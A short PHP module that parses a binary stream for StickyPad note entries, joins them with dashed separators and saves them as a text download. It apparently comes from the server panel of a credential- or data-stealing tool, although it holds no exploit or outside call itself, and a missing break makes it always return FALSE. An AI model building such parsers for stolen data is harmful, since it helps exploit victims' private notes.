<?php
class Module_stickypad extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$Stream = new Stream($Data);
			
			$Result = '';
			
			while(TRUE)
			{
				if($Stream->GetDWORD() === NULL)
					break;
				
				$Buffer = $Stream->getBINARY_();
				if($Buffer == NULL)
					break;
				
				$Valid = strstr($Buffer, "<stickypad>");
				if($Valid)
				{
					$Result .= substr($Buffer, 0, strlen($Buffer) - strlen($Valid));
					$Result .= str_pad("", 30, "-") . "\r\n";
				}
			}
			
			$this->insert_downloads(substr($Result, 0, 20) . ".txt", $Result);
			
			$Result = $Stream = NULL;
			
        default:
            return FALSE;
        }

        return TRUE;
    }
}

